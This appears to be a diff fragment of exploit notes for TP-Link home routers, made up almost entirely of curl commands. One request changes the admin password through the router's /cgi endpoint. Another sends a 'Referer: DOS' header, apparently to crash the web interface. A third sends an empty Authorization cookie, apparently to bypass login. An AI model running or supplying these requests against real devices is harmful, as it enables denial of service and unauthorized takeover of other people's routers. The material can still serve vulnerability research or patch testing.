@@ -39,3 +39,5 @@ Mozilla/Agent22" -H 'Accept: */*' -H "Referer:
 http://192.168.0.1/mainFrame.htm" --data-binary
 $'"[/cgi/auth#0,0,0,0,0,0#0,0,0,0,0,0]0,3\r\nname=a\r\noldPwd=admin\r\npwd=test\r\n"' http://192.168.0.1/cgi?8
 
+curl 'http://tplinkwifi.net/' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: DOS' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' --compressed
+curl 'http://tplinkwifi.net/' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://tplinkwifi.net/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: Authorization;' --compressed
